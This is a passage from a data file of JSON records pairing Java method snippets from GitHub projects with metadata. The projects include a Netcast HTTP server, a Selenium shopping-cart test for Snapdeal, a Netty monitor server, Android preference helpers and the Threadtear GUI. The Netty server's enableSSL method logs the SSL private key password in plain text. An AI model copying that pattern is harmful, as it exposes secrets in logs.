System.out.println(\"TextEdited\");\n\n                String newValue = \"\";\n\n                try {\n                    newValue = handler.getJSONObject().getString(\"value\");\n                } catch (JSONException ex) {\n                    ex.printStackTrace();\n                }\n\n                Util.postSuccess(textChangedListener, newValue);\n            }\n            else if (body.contains(\"3DMode\")) {\n                try {\n                    String enabled = (String) handler.getJSONObject().get(\"value\");\n                    boolean bEnabled;\n\n                    bEnabled = enabled.equalsIgnoreCase(\"true\");\n\n                    for (URLServiceSubscription<?> sub: subscriptions) {\n                        if (sub.getTarget().equalsIgnoreCase(\"3DMode\")) {\n                            for (int i = 0; i < sub.getListeners().size(); i++) {\n                                @SuppressWarnings(\"unchecked\")\n                                ResponseListener<Object> listener = (ResponseListener<Object>) sub.getListeners().get(i);\n                                Util.postSuccess(listener, bEnabled);\n                            }\n                        }\n                    }\n                } catch (JSONException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/netcast/NetcastHttpServer.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56659, "method_name": "stop", "class_name": "NetcastHttpServer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void stop() {\n        if (!running)\n            return;\n\n        if (welcomeSocket != null && !welcomeSocket.isClosed()) {\n            try {\n                welcomeSocket.close();\n            } catch (IOException ex) {\n                ex.printStackTrace();\n            }\n        }\n\n        welcomeSocket = null;\n        running = false;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/netcast/NetcastHttpServer.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56660, "method_name": "setSubscriptions", "class_name": "NetcastHttpServer", "params": ["List<URLServiceSubscription>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSubscriptions(List<URLServiceSubscription<?>> subscriptions) {\n        this.subscriptions = subscriptions;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/netcast/NetcastHttpServer.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56661, "method_name": "main", "class_name": "Snapdeal", "params": ["String"], "throws": ["InterruptedException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) throws InterruptedException {\n\t\t// TODO Auto-generated method stub\n\n\t\t\n\n\t\tSystem.setProperty(\"webdriver.chrome.driver\", \"./drivers/chromedriver.exe\");\n\t\tSystem.setProperty(\"webdriver.chrome.silentOutput\", \"true\");\n\t\t\n\t\tChromeOptions options = new ChromeOptions();\n\t\toptions.addArguments(\"--disable-notifications\");\n\t\t\n\t\tDesiredCapabilities cap = new DesiredCapabilities();\n\t\tcap.setCapability(CapabilityType.UNEXPECTED_ALERT_BEHAVIOUR, UnexpectedAlertBehaviour.DISMISS);\n\t\toptions.merge(cap);\n\t\t\n\t\tdriver = new ChromeDriver(options);\n\t\tActions action = new Actions(driver);\n\t\tWebDriverWait wait = new WebDriverWait(driver, 30);\n\t\t\n\t\t\n\t\tdriver.get(\"https://snapdeal.com\");\n\t\tdriver.manage().timeouts().implicitlyWait(5000, TimeUnit.SECONDS);\n\t\tdriver.manage().window().maximize();\n\t\t\n\t\t\n\t\tWebElement ToysMain = driver.findElementByLinkText(\"Toys, Kids' Fashion & more\");\n\t\taction.moveToElement(ToysMain).build().perform();\n\t\tThread.sleep(2000);\n\t\t\n\t\tWebElement Toys = driver.findElementByXPath(\"//span[text()= 'Toys']\");\n\t\twait.until(ExpectedConditions.elementToBeClickable(Toys));\n\t\taction.click(Toys).build().perform();\n\t\t\n\t\tSystem.out.println(\"Toys Selected\");\n\t\tThread.sleep(5000);\n\t\t\n\t\tWebElement eleEducation = driver.findElementByXPath(\"//div[text()='Educational Toys']\");\n\t\twait.until(ExpectedConditions.visibilityOf(eleEducation)).click();\n\t\t\n\t\t\n\t\tWebElement eleRating = driver.findElementByXPath(\"(//input[@type='radio']/following-sibling::label)[1]\");\n\t\twait.until(ExpectedConditions.elementToBeClickable(eleRating)).click();\n\t\tThread.sleep(2000);\n\t\t\n\t\t// Click the offer as 40-50\n\t\tWebElement eleOffer = driver.findElementByXPath(\"//input[@value='40%20-%2050']/following-sibling::label[1]\");\n\t\twait.until(ExpectedConditions.elementToBeClickable(eleOffer)).click();\n\t\t\n\t\t// Check the availability for the pincode\n\t\tWebElement elePin = driver.findElementByXPath(\"//input[@placeholder='Enter your pincode']\");\n\t\twait.until(ExpectedConditions.elementToBeClickable(elePin)).sendKeys(\"600088\");\n\t\tThread.sleep(1000);\n\t\t\n\t\tdriver.findElementByXPath(\"//button[text()='Check']\").click();\n\t\tThread.sleep(1000);\n\t\t\t\n\t\t// Click the Quick View of the first product \n\t\tWebElement firstProduct = driver.findElementByXPath(\"(//img[@class='product-image wooble'])[1]\");\n\t\twait.until(ExpectedConditions.visibilityOf(firstProduct));\n\t\taction.moveToElement(firstProduct).build().perform();\n\t\t\n\t\tWebElement eleQuick = driver.findElementByXPath(\"(//div[@class='clearfix row-disc']//div)[1]\");\n\t\twait.until(ExpectedConditions.visibilityOf(eleQuick)).click();\n\t\tThread.sleep(1000);\n\t\t\n\t\t//Click on View Details\n\t\tWebElement ViewDetails = driver.findElementByXPath(\"//a[contains(text(),'view details')]\"); \n\t\twait.until(ExpectedConditions.visibilityOf(ViewDetails)).click();\n\t\t \n\t\t//Capture the Price of the Product and Delivery Charge\n\t\tWebElement ProdPrice = driver.findElementByClassName(\"payBlkBig\");\n\t\tString price = wait.until(ExpectedConditions.visibilityOf(ProdPrice)).getText();\n\t\tSystem.out.println(\"Price of the product: \"+price);\n\t\tprice = price.replaceAll(\"\\\\D\", \"\");\n\t\tint Price = Integer.parseInt(price);\n\t\t\n\t\tString delivery = driver.findElementByXPath(\"(//span[@class='availCharges'])[2]\").getText();\n\t\tSystem.out.println(\"Delivery Charges: \"+delivery);\n\t\tdelivery = delivery.replaceAll(\"\\\\D\", \"\");\n\t\tint Delivery = Integer.parseInt(delivery);\n\t\t\n\t\tint totalCharges = Price + Delivery;\n\t\tSystem.out.println(\"Total charges of first product in the result: \"+totalCharges);\n\t\t\n\t\t//Click on Add to Cart\n\t\tdriver.findElementByXPath(\"//span[text()='add to cart']\").click();\n\t\t\n\t\t//10) Validate the You Pay amount matches the sum of (price+deliver charge)\n\t\tWebElement elePay = driver.findElementByXPath(\"//div[@class='you-pay']//span[1]\");\n\t\tString pay = wait.until(ExpectedConditions.visibilityOf(elePay)).getText();\n\t\tSystem.out.println(\"You pay: \"+pay);\n\t\tpay = pay.replaceAll(\"\\\\D\", \"\");\n\t\tint youPay = Integer.parseInt(pay);\n\t\t\n\t\tif(totalCharges == youPay)\n\t\t\tSystem.out.println(\"You pay amount matches with the product price + deliver charges\");\n\t\telse\n\t\t\tSystem.out.println(\"You pay amount does not match with the product price + deliver charges\");\n\t\t\n\t\t//11) Search for Sanitizer\n\t\tdriver.findElementById(\"inputValEnter\").sendKeys(\"Sanitizer\",Keys.ENTER);\n\t\t\n\t\t//12) Click on Product \"BioAyurveda Neem Power Hand Sanitizer\"\n\t\tWebElement eleSanitizer = driver.findElementByXPath(\"//p[@title='BioAyurveda Neem Power  Hand Sanitizer 500 mL Pack of 1']\");\n\t\twait.until(ExpectedConditions.visibilityOf(eleSanitizer)).click();\n\t\t\n\t\tSet<String> windowHandles = driver.getWindowHandles();\n\t\tList<String>windowHandlesList = new ArrayList<String>(windowHandles);\n\t\tdriver.switchTo().window(windowHandlesList.get(1));\n\t\t\n\t\t//13) Capture the Price and Delivery Charge\n\t\tWebElement elePrice1 = driver.findElementByClassName(\"payBlkBig\");\n\t\tString price1 = wait.until(ExpectedConditions.visibilityOf(elePrice1)).getText();\n\t\tSystem.out.println(\"Price of the product: \"+price1);\n\t\tprice1 = price1.replaceAll(\"\\\\D\", \"\");\n\t\tint Price1 = Integer.parseInt(price1);\n\t\t\n\t\tString delivery1 = driver.findElementByXPath(\"(//span[@class='availCharges'])[2]\").getText();\n\t\tSystem.out.println(\"Delivery Charges: \"+delivery1);\n\t\tdelivery1 = delivery1.replaceAll(\"\\\\D\", \"\");\n\t\tint Delivery1 = Integer.parseInt(delivery1);\n\t\t\n\t\tint total2 = Price1 + Delivery1;\n\t\tSystem.out.println(\"Total charges of Sanitizer: \"+total2);\n\t\t\n\t\t//14) Click on Add to Cart\n\t\tThread.sleep(1000);\n\t\t//JavascriptExecutor executor = (JavascriptExecutor)driver;\n\t\t//executor.executeScript(\"scroll(0, 250)\");\n\t\tdriver.findElementById(\"add-cart-button-id\").click();\n\t\t\n\t\tThread.sleep(3000);\n\t\twait.until(ExpectedConditions.elementToBeClickable(driver.findElementByClassName(\"cartTextSpan\")));\n\t\tdriver.findElementByClassName(\"cartTextSpan\").click();\n\t\t\n\t\t//15) Click on Cart  \n\t\tWebElement eleCart = driver.findElementByClassName(\"cartTextSpan\");\n\t\twait.until(ExpectedConditions.elementToBeClickable(eleCart));\n\t\taction.click(eleCart).build().perform();\n\t\t\t\t\n\t\t//16) Validate the Proceed to Pay matches the total amount of both the products\n\t\tWebElement eleProceed = driver.findElementByXPath(\"//input[@type='button']\");\n\t\tString grandTotal = wait.until(ExpectedConditions.visibilityOf(eleProceed)).getAttribute(\"value\");\n\t\tSystem.out.println(\"Proceed to Pay Amount: \"+grandTotal);\n\t\tgrandTotal = grandTotal.replaceAll(\"\\\\D\", \"\");\n\t\tint proceedPay = Integer.parseInt(grandTotal);\n\t\t\n\t\tint GrandTotal = totalCharges + total2;\n\t\tSystem.out.println(\"Calculated Total Amount: \"+GrandTotal);\n\t\t\n\t\tif(GrandTotal == proceedPay)\n\t\t\tSystem.out.println(\"The Proceed to Pay amount matches with total amount of both products\");\n\t\telse\n\t\t\tSystem.out.println(\"The Proceed to Pay amount does not match with total amount of both products\");\n\t\t\n\t\t//17) Close all the windows\n\t\tdriver.quit();\n\t\t\n\t\t\n\t}", "url": "https://raw.githubusercontent.com/Code-WithPraveen/SeleniumAndJava/master/Snapdeal.java", "stars": "11", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56662, "method_name": "start", "class_name": "NettyMonitorServer", "params": ["NettyMonitor"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void start(NettyMonitor nettyMonitor) throws Exception {\n    long startMs = System.currentTimeMillis();\n\n    this.nettyMonitor = nettyMonitor;\n    this.environment = nettyMonitor.environment();\n    this.printBanner();\n\n    final String serialNumber = this.computerSystem.getSerialNumber();\n    final String model = this.computerSystem.getModel();\n    final String name = firmware.getName();\n    final String bootClsName = nettyMonitor.bootName();\n    final String currentUserName = System.getProperty(\"user.name\");\n    final String pidCode = SystemInfoUtils.getPid();\n    final String hostName = SystemInfoUtils.getHostName();\n    final Integer availableProcessors = SystemInfoUtils.getAvailableProcessors();\n\n    log.info(\"Starting {} on {} with PID {} \", bootClsName, name + \"/\" + currentUserName, pidCode);\n    log.info(\"The serialized version number of this machine is {}\", serialNumber);\n    log.info(\"The computer system mode is {}\", model);\n    log.info(\"The host name is {}\", hostName);\n    log.info(\"The current computer has {} processors available\", availableProcessors);\n    log.info(\"Starting service [Netty]\");\n    log.info(\"Starting Iot Server: Netty/4.1.45.Final\");\n\n    this.enableSSL();\n    this.startServer(startMs);\n    this.shutdownHook();\n  }", "url": "https://raw.githubusercontent.com/everknwon/netty-monitor/master/src/main/java/io/netty/monitor/NettyMonitorServer.java", "stars": "3", "class_props": {"extends": null, "implements": ["Server"], "modifiers": ["public"]}}, {"id": 56663, "method_name": "enableSSL", "class_name": "NettyMonitorServer", "params": [], "throws": ["CertificateException", "SSLException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void enableSSL() throws CertificateException, SSLException {\n    log.info(\"Check if the ssl configuration is enabled.\");\n\n    final Boolean ssl = environment.getBoolean(PATH_SERVER_SSL, SERVER_SSL);\n    final SelfSignedCertificate ssc = new SelfSignedCertificate();\n\n    if (ssl) {\n      log.info(\"Ssl configuration takes effect :{}\", true);\n\n      final String sslCert = this.environment.get(PATH_SERVER_SSL_CERT, null);\n      final String sslPrivateKey = this.environment.get(PATH_SERVER_SSL_PRIVATE_KEY, null);\n      final String sslPrivateKeyPass = this.environment.get(PATH_SERVER_SSL_PRIVATE_KEY_PASS, null);\n\n      log.info(\"SSL CertChainFile  Path: {}\", sslCert);\n      log.info(\"SSL PrivateKeyFile Path: {}\", sslPrivateKey);\n      log.info(\"SSL PrivateKey Pass: {}\", sslPrivateKeyPass);\n\n      this.sslContext = SslContextBuilder.forServer(setKeyCertFileAndPriKey(sslCert, ssc.certificate()),\n              setKeyCertFileAndPriKey(sslPrivateKey, ssc.privateKey()), sslPrivateKeyPass).build();\n    }\n\n    log.info(\"Current netty server ssl startup status: {}\", ssl);\n    log.info(\"A valid ssl connection configuration is not configured and is rolled back to the default connection state.\");\n  }", "url": "https://raw.githubusercontent.com/everknwon/netty-monitor/master/src/main/java/io/netty/monitor/NettyMonitorServer.java", "stars": "3", "class_props": {"extends": null, "implements": ["Server"], "modifiers": ["public"]}}, {"id": 56664, "method_name": "setKeyCertFileAndPriKey", "class_name": "NettyMonitorServer", "params": ["String", "File"], "throws": null, "modifiers": ["private"], "return_type": "File", "snippet": "  private File setKeyCertFileAndPriKey(String keyPath, File defaultFilePath) {\n    return keyPath != null ? Paths.get(keyPath).toFile() : defaultFilePath;\n  }", "url": "https://raw.githubusercontent.com/everknwon/netty-monitor/master/src/main/java/io/netty/monitor/NettyMonitorServer.java", "stars": "3", "class_props": {"extends": null, "implements": ["Server"], "modifiers": ["public"]}}, {"id": 56665, "method_name": "startServer", "class_name": "NettyMonitorServer", "params": ["long"], "throws": ["Exception"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void startServer(long startMs) throws Exception {\n    ResourceLeakDetector.setLevel(ResourceLeakDetector.Level.DISABLED);\n\n    this.serverBootstrap.childHandler(new NettyMonitorServerInitializer(sslContext));\n\n    int acceptThreadCount = environment.getInteger(PATH_SERVER_NETTY_ACCEPT_THREAD_COUNT, DEFAULT_ACCEPT_THREAD_COUNT);\n    int ioThreadCount = environment.getInteger(PATH_SERVER_NETTY_IO_THREAD_COUNT, DEFAULT_IO_THREAD_COUNT);\n\n    NettyServerGroup nettyServerGroup = EventLoopKit.nioGroup(acceptThreadCount, ioThreadCount);\n    this.bossGroup = nettyServerGroup.getBossGroup();\n    this.workerGroup = nettyServerGroup.getWorkGroup();\n\n    if (EventLoopKit.epollIsAvailable()) {\n      nettyServerGroup = EventLoopKit.epollGroup(acceptThreadCount, ioThreadCount);\n      this.bossGroup = nettyServerGroup.getBossGroup();\n      this.workerGroup = nettyServerGroup.getWorkGroup();\n    }\n\n    this.serverBootstrap.group(bossGroup, workerGroup).channel(nettyServerGroup.getChannelClass())\n            .childOption(ChannelOption.SO_KEEPALIVE, true)\n            .option(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT)\n            .option(ChannelOption.SO_BACKLOG, 128);\n\n    String bootClsSimpleName = EventLoopKit.judgeMode(nettyServerGroup.getChannelClass().getSimpleName());\n    log.info(\"The IO mode of the application startup is: {}\", bootClsSimpleName);\n\n    String address = this.environment.getString(Const.PATH_SERVER_ADDRESS, Const.SERVER_ADDRESS);\n    Integer port = this.environment.getInteger(Const.PATH_SERVER_PORT, Const.SERVER_PORT);\n\n    this.channel = serverBootstrap.bind(address, port).sync().channel();\n\n    this.stop = false;\n\n    long endTime = System.currentTimeMillis();\n    long startUpTime = (endTime - startMs);\n    long jvmStartTime = (endTime - SystemInfoUtils.getJvmStartUpTime());\n\n    log.info(\"Iot Server started on port(s): {} with context path ''\", port);\n    log.info(\"Started {} in {} ms (JVM running for {} ms)\", nettyMonitor.bootName(), startUpTime, jvmStartTime);\n    log.info(\"The tcp service has been started, allowing connections to be established\");\n  }", "url": "https://raw.githubusercontent.com/everknwon/netty-monitor/master/src/main/java/io/netty/monitor/NettyMonitorServer.java", "stars": "3", "class_props": {"extends": null, "implements": ["Server"], "modifiers": ["public"]}}, {"id": 56666, "method_name": "shutdownHook", "class_name": "NettyMonitorServer", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void shutdownHook() {\n    Thread shutdownThread = new Thread(this::stop);\n    shutdownThread.setName(\"shutdown@thread\");\n    Runtime.getRuntime().addShutdownHook(shutdownThread);\n  }", "url": "https://raw.githubusercontent.com/everknwon/netty-monitor/master/src/main/java/io/netty/monitor/NettyMonitorServer.java", "stars": "3", "class_props": {"extends": null, "implements": ["Server"], "modifiers": ["public"]}}, {"id": 56667, "method_name": "stop", "class_name": "NettyMonitorServer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void stop() {\n    log.info(\"Netty Server Shutdown...\");\n    if (stop) {\n      return;\n    }\n    stop = true;\n    try {\n      if (bossGroup != null) {\n        this.bossGroup.shutdownGracefully();\n      }\n      if (workerGroup != null) {\n        this.workerGroup.shutdownGracefully();\n      }\n      log.info(\"The netty service is gracefully closed\");\n    } catch (Exception e) {\n      log.error(\"An exception occurred while the Netty Iot service was down\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/everknwon/netty-monitor/master/src/main/java/io/netty/monitor/NettyMonitorServer.java", "stars": "3", "class_props": {"extends": null, "implements": ["Server"], "modifiers": ["public"]}}, {"id": 56668, "method_name": "join", "class_name": "NettyMonitorServer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void join() {\n    try {\n      this.channel.closeFuture().sync();\n    } catch (InterruptedException e) {\n      log.error(\"Channel close future fail\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/everknwon/netty-monitor/master/src/main/java/io/netty/monitor/NettyMonitorServer.java", "stars": "3", "class_props": {"extends": null, "implements": ["Server"], "modifiers": ["public"]}}, {"id": 56669, "method_name": "printBanner", "class_name": "NettyMonitorServer", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void printBanner() {\n    this.defaultBanner.printBanner(System.out, Const.BANNER_TEXT, BannerFont.FONT_DEFAULT);\n  }", "url": "https://raw.githubusercontent.com/everknwon/netty-monitor/master/src/main/java/io/netty/monitor/NettyMonitorServer.java", "stars": "3", "class_props": {"extends": null, "implements": ["Server"], "modifiers": ["public"]}}, {"id": 56670, "method_name": "saveSort", "class_name": "PrefSortShopItems", "params": ["Context", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void saveSort(Context context, String sort_by)\n    {\n\n        // get a handle to shared Preference\n        SharedPreferences sharedPref;\n\n        sharedPref = context.getSharedPreferences(\n                context.getString(R.string.preference_file_name),\n                MODE_PRIVATE);\n\n        // write to the shared preference\n        SharedPreferences.Editor editor = sharedPref.edit();\n        editor.putString(\"sort_shop_item_by_item\", sort_by);\n        editor.apply();\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Lists/ShopsAvailableForItem/SlidingLayerSort/PrefSortShopItems.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56671, "method_name": "getSort", "class_name": "PrefSortShopItems", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getSort(Context context)\n    {\n\n        SharedPreferences sharedPref = context.getSharedPreferences(context.getString(R.string.preference_file_name), MODE_PRIVATE);\n        String sort_by = sharedPref.getString(\"sort_shop_item_by_item\", SlidingLayerSortShopItem.SORT_BY_DISTANCE);\n\n        return sort_by;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Lists/ShopsAvailableForItem/SlidingLayerSort/PrefSortShopItems.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56672, "method_name": "saveAscending", "class_name": "PrefSortShopItems", "params": ["Context", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void saveAscending(Context context, String descending)\n    {\n\n\n        // get a handle to shared Preference\n        SharedPreferences sharedPref;\n\n        sharedPref = context.getSharedPreferences(\n                context.getString(R.string.preference_file_name),\n                MODE_PRIVATE);\n\n        // write to the shared preference\n        SharedPreferences.Editor editor = sharedPref.edit();\n        editor.putString(\"sort_descending_sort_item_by_item\",descending);\n        editor.apply();\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Lists/ShopsAvailableForItem/SlidingLayerSort/PrefSortShopItems.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56673, "method_name": "getAscending", "class_name": "PrefSortShopItems", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getAscending(Context context)\n    {\n\n        SharedPreferences sharedPref = context.getSharedPreferences(context.getString(R.string.preference_file_name), MODE_PRIVATE);\n        String descending = sharedPref.getString(\"sort_descending_sort_item_by_item\", SlidingLayerSortShopItem.SORT_DESCENDING);\n\n        return descending;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Lists/ShopsAvailableForItem/SlidingLayerSort/PrefSortShopItems.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56674, "method_name": "onCreate", "class_name": "DemoMainActivity", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_demo);\n        mList = (ListView) findViewById(R.id.list);\n        ArrayList<String> examples = new ArrayList<String>(Arrays.asList(EXAMPLES));\n\n        // Create ArrayAdapter using the list.\n        mAdapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, examples);\n        mList.setAdapter(mAdapter);\n        mList.setOnItemClickListener(mListener);\n\n        PinItButton.setDebugMode(true);\n        PinItButton.setPartnerId(CLIENT_ID);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/PinItDemo/src/com/pinterest/samples/pinit/DemoMainActivity.java", "stars": "74", "class_props": {"extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"id": 56675, "method_name": "saveItemCategory", "class_name": "PrefItemCategory", "params": ["ItemCategory", "Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void saveItemCategory(ItemCategory itemCategory, Context context)\n    {\n\n        //Creating a shared preference\n\n        SharedPreferences sharedPref = context.getSharedPreferences(context.getString(R.string.preference_file_name), MODE_PRIVATE);\n\n        SharedPreferences.Editor prefsEditor = sharedPref.edit();\n\n        if(itemCategory == null)\n        {\n            prefsEditor.putString(TAG_ITEM_PREF, \"null\");\n\n        }\n        else\n        {\n            Gson gson = new Gson();\n            String json = gson.toJson(itemCategory);\n            prefsEditor.putString(TAG_ITEM_PREF, json);\n        }\n\n        prefsEditor.apply();\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/EditDataScreens/EditItemCategory/PrefItemCategory.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56676, "method_name": "getItemCategory", "class_name": "PrefItemCategory", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "ItemCategory", "snippet": "    public static ItemCategory getItemCategory(Context context)\n    {\n        SharedPreferences sharedPref = context.getSharedPreferences(context.getString(R.string.preference_file_name), MODE_PRIVATE);\n\n        Gson gson = new Gson();\n        String json = sharedPref.getString(TAG_ITEM_PREF, \"null\");\n\n        if(json.equals(\"null\"))\n        {\n\n            return null;\n\n        }else\n        {\n            return gson.fromJson(json, ItemCategory.class);\n        }\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/EditDataScreens/EditItemCategory/PrefItemCategory.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56677, "method_name": "getMinimumSize", "class_name": "ClassTreePanel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Dimension", "snippet": "  public Dimension getMinimumSize() {\n    Dimension minSize = super.getMinimumSize();\n    minSize.width = 150;\n    return minSize;\n  }", "url": "https://raw.githubusercontent.com/GraxCode/threadtear/master/src/me/nov/threadtear/swing/tree/ClassTreePanel.java", "stars": "140", "class_props": {"extends": "JPanel", "implements": ["ILoader"], "modifiers": ["public"]}}, {"id": 56678, "method_name": "createButtons", "class_name": "ClassTreePanel", "params": [], "throws": null, "modifiers": ["private"], "return_type": "JPanel", "snippet": "  private JPanel createButtons() {\n    JPanel panel = new JPanel(new GridLayout(1, 4, 4, 4));\n    panel.setBorder(BorderFactory.createEmptyBorder(0, 2, 0, 2));\n    obfAnalysis = new JButton(\"Full analysis\", IconLoader.get().loadSVGIcon(\"res/analysis.svg\", false));\n    obfAnalysis.addActionListener(l -> {\n      threadtear.logFrame.setVisible(true);\n      new Thread(() -> InstructionAnalysis.analyze(classes)).start();\n    });\n    obfAnalysis.setEnabled(false);\n    panel.add(obfAnalysis);\n    analyze = new JButton(\"Analyze code\", IconLoader.get().loadSVGIcon(\"res/decompile.svg\", false));\n    analyze.addActionListener(l -> {\n      ClassTreeNode tn = (ClassTreeNode) tree.getLastSelectedPathComponent();\n      if (tn != null && tn.member != null) {\n        new AnalysisFrame(tn.member).setVisible(true);\n      }\n    });\n    panel.add(analyze);\n    analyze.setEnabled(false);\n    fileInfo = new JButton(\"Information\", IconLoader.get().loadSVGIcon(\"res/file.svg\", false));\n    fileInfo.addActionListener(l -> {\n      ClassTreeNode tn = (ClassTreeNode) tree.getLastSelectedPathComponent();\n      if (tn != null && tn.member != null) {\n        new FileInfo(ClassTreePanel.this, tn.member).setVisible(true);\n      }\n    });\n\n    panel.add(fileInfo);\n    fileInfo.setEnabled(false);\n    ignore = new JButton(\"Ignore\", IconLoader.get().loadSVGIcon(\"res/ignore.svg\", false));\n    ignore.addActionListener(l -> {\n      TreePath[] paths = tree.getSelectionPaths();\n      for (int i = 0; i < paths.length; i++) {\n        ClassTreeNode tn = (ClassTreeNode) paths[i].getLastPathComponent();\n        ignoreChilds(tn);\n      }\n      refreshIgnored();\n      tree.grabFocus();\n    });\n    ignore.setEnabled(false);\n    panel.add(ignore);\n    return panel;\n  }", "url": "https://raw.githubusercontent.com/GraxCode/threadtear/master/src/me/nov/threadtear/swing/tree/ClassTreePanel.java", "stars": "140", "class_props": {"extends": "JPanel", "implements": ["ILoader"], "modifiers": ["public"]}}, {"id": 56679, "method_name": "refreshIgnored", "class_name": "ClassTreePanel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void refreshIgnored() {\n    if (classes != null) {\n      long disabled = classes.stream().filter(c -> !c.transform).count();\n      outerPanel.setBorder(BorderFactory.createTitledBorder(Strings.min(inputFile.getName(), 40) + \" - \" + classes.size() + \" classes (\" + disabled + \" ignored)\"));\n    }\n    repaint();\n  }", "url": "https://raw.githubusercontent.com/GraxCode/threadtear/master/src/me/nov/threadtear/swing/tree/ClassTreePanel.java", "stars": "140", "class_props": {"extends": "JPanel", "implements": ["ILoader"], "modifiers": ["public"]}}, {"id": 56680, "method_name": "ignore", "class_name": "ClassTreePanel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void ignore(String className) {\n    classes.stream().filter(c -> c.node.name.equals(className)).forEach(c -> c.transform = false);\n  }", "url": "https://raw.githubusercontent.com/GraxCode/threadtear/master/src/me/nov/threadtear/swing/tree/ClassTreePanel.java", "stars": "140", "class_props": {"extends": "JPanel", "implements": ["ILoader"], "modifiers": ["public"]}}, {"id": 56681, "method_name": "updateAllNames", "class_name": "ClassTreePanel", "params": ["ClassTreeNode"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void updateAllNames(ClassTreeNode root) {\n    root.updateClassName();\n    for (int i = 0; i < root.getChildCount(); i++) {\n      ClassTreeNode child = (ClassTreeNode) root.getChildAt(i);\n      updateAllNames(child);\n    }\n  }", "url": "https://raw.githubusercontent.com/GraxCode/threadtear/master/src/me/nov/threadtear/swing/tree/ClassTreePanel.java", "stars": "140", "class_props": {"extends": "JPanel", "implements": ["ILoader"], "modifiers": ["public"]}}, {"id": 56682, "method_name": "ignoreChilds", "class_name": "ClassTreePanel", "params": ["ClassTreeNode"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void ignoreChilds(ClassTreeNode node) {\n    if (node.member != null) {\n      node.member.transform = !node.member.transform;\n      node.updateClassName();\n    } else {\n      for (int i = 0; i < node.getChildCount(); i++) {\n        ClassTreeNode child = (ClassTreeNode) node.getChildAt(i);\n        ignoreChilds(child);\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/GraxCode/threadtear/master/src/me/nov/threadtear/swing/tree/ClassTreePanel.java", "stars": "140", "class_props": {"extends": "JPanel", "implements": ["ILoader"], "modifiers": ["public"]}}, {"id": 56683, "method_name": "onFileDrop", "class_name": "ClassTreePanel", "params": ["File"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void onFileDrop(File input) {\n    this.remove(outerPanel);\n    Threadtear.logger.info(\"Loading class files from {}\", input.getAbsolutePath());\n    String type = FilenameUtils.getExtension(input.getAbsolutePath());\n    LoadingIndicator loadingLabel = new LoadingIndicator(\"Loading class file(s)... \", JLabel.CENTER);\n    